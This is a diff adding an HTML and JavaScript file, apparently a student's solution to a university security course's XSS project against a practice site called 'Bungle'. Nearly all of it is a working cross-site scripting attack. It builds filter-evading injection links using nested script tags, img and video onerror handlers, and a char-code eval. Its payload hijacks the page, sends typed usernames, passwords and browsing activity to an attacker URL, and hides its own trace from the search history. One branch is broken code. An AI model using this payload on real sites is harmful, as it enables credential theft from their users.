@@ -1,0 +1,268 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+    var currentTitle;
+    var currentPage;
+
+    var currentUser = "";
+
+    function log(data) {
+        console.log($.param(data))
+        $.get(attacker, data);
+    }
+
+    function updateCurrentPage(newHtml, newTitle, newPage) {
+        $("body").html(newHtml);
+        currentTitle = newTitle;
+        currentPage = newPage;
+        let stateDict = {
+            "html": $("body").html(),
+            "title": currentTitle,
+            "page": currentPage
+        }
+        window.history.replaceState(stateDict, currentTitle, currentPage);
+        $("title")[0].text = currentTitle;
+
+        injectIntoPage();
+        logPage();
+    }
+
+    function updateHistory() {
+        let stateDict = {
+            "html": $("body").html(),
+            "title": currentTitle,
+            "page": currentPage
+        }
+        window.history.pushState(stateDict, currentTitle, currentPage);
+    }
+
+    function injectIntoPage() {
+        /** login form **/
+        let loginButton = $("#log-in-btn");
+        let createAccountButton = $("#new-account-btn");
+
+        let usernameField = $("#username")[0];
+        let userpassField = $("#userpass")[0];
+
+        $('.form-inline').attr('onsubmit', 'return false');
+
+        /* login button */
+        if (loginButton) {
+            loginButton.click(function() {
+                if (usernameField.value && usernameField.value) {
+                    console.log("attempt login");
+
+                    $.post(
+                        "./login",
+                        {
+                            username: usernameField.value,
+                            password: userpassField.value
+                        }
+                    )
+                    .done(function(data) {
+                        currentUser = usernameField.value
+                        log({event: "login", user: currentUser, pass: userpassField.value});
+                        updateHistory();
+                        updateCurrentPage(data, "Bungle!", "./");
+                        return false;
+                    })
+                    .fail(function (jqXHR, textStatus, error) {
+                        updateHistory();
+                        textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
+                        let newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                        updateCurrentPage(jqXHR.responseText, newTitle, "./login");
+                        return false;
+                    });
+                }
+            });
+        }
+
+        /* create account button */
+        if (createAccountButton) {
+            createAccountButton.click(function() {
+                if (usernameField.value && usernameField.value) {
+                    console.log("create login");
+
+                    $.post(
+                        "./create",
+                        {
+                            username: usernameField.value,
+                            password: userpassField.value
+                        }
+                    )
+                    .done(function(data) {
+                        currentUser = usernameField.value
+                        log({event: "login", user: currentUser, pass: userpassField.value});
+                        updateHistory();
+                        updateCurrentPage(data, "Bungle!", "./");
+                        return false;
+                    })
+                    .fail(function (jqXHR, textStatus, error) {
+                        updateHistory();
+                        textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
+                        let newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                        updateCurrentPage(jqXHR.responseText, newTitle, "./create");
+                        return false;
+                    });
+                }
+            });
+        }
+
+        /* logout button */
+        let logoutButton = $("#log-out-btn");
+        if (logoutButton) {
+            logoutButton.click(function() {
+                $.post("./logout")
+                .done(function(data) {
+                    log({event: "logout", user: currentUser});
+                    currentUser = ""
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                })
+                .fail(function (jqXHR, textStatus, error) {
+                    updateHistory();
+                    let newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                    updateCurrentPage(jqXHR.responseText, newTitle, "./logout");
+                    return false;
+                });
+            });
+            logoutButton.attr('onsubmit', 'return false');
+        }
+
+        /* bungle button */
+        let bungleLink = $("#bungle-lnk");
+        if (bungleLink) {
+            bungleLink.removeAttr('href');
+            bungleLink.click(function() {
+                $.get("./")
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                });
+            });
+        }
+
+        /* search button */
+        let searchButton = $("#search-btn");
+        let queryField = $("#query")[0];
+        if (searchButton) {
+            searchButton.click(function() {
+                let urlS = "./search?q=" + queryField.value;
+                $.get(urlS)
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Search Results", urlS);
+                    return false;
+                });
+            });
+            searchButton.attr('onsubmit', 'return false');
+        }
+
+        /* search again button */
+        let searchAgainButton = $("#search-again-btn");
+        if (searchAgainButton) {
+            searchAgainButton.removeAttr('href');
+            searchAgainButton.click(function() {
+                $.get("./")
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                });
+            });
+        }
+
+        /* search history */
+        $(".history-item").removeAttr('href');
+        $.each($(".history-item"), function() {
+            console.log("helasd1");
+
+            $(this).click(function() {
+                console.log("helasd");
+                let urlS = "./search?q=" + this.text;
+                $.get(urlS)
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Search Results", urlS);
+                    return false;
+                });
+            });
+            console.log(this.text);
+            if (this.text.includes("payload(attacker)")) {
+                this.remove();
+            }
+        });
+    }
+
+    function logPage() {
+        let path = window.location.href;
+        log({event: "nav", user: currentUser, url: path});
+    }
+
+    function proxy(href) {
+        $("body").load(href, function() {
+            $("body").attr('style', 'background-color:powderblue;');
+            updateCurrentPage($("body").html(), "Bungle!", "./");
+
+            window.onpopstate = function(event) {
+                let html = event.state["html"];
+                let title = event.state["title"];
+                let page = event.state["page"];
+                updateCurrentPage(html, title, page);
+            };
+        });
+    }
+    $("body").empty();
+    proxy("./");
+}
+
+function makeLink(xssdefense, target, attacker) {
+    var payloadString = payload.toString()
+    payloadString = payloadString.replace(/^\s+/mg, '');
+
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + payloadString +
+            ";payload(\"" + attacker + "\");<\/script" + ">");
+    } else if (xssdefense == 1) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<scrscriptipt" + ">" + payloadString +
+            ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+    } else if (xssdefense == 2) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<img src='x' onerror=\'" + payloadString
+            + ";payload(\"" + attacker + "\");\'>");
+    } else if (xssdefense == 3){
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<video src=x onerror=\'" + payloadString
+            + ";payload(\"" + attacker + "\");\'>");
+    } else if (xssdefense == 4) {
+        var payloadMin = payload.toString().minify();
+        var payloadString = "";
+        for (var i = 0; i < input.length; ++i) {
+            if (payloadString != "") payloadString += ", ";
+            payloadString += input.charCodeAt(i);
+        }
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + "eval(String.fromCharCode(payloadString))" +
+            "<\/script" + ">");
+    }
+}
+
+var xssdefense = 3;
+var target = "http://bungle-cs461.csl.illinois.edu/";
+// var target = "http://192.168.1.38:8080/";
+var attacker = "http://127.0.0.1:31337/stolen";
+// var attacker = "http://10.0.1.17:31337/stolen/";
+
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+
+</script>
+<h3></h3>
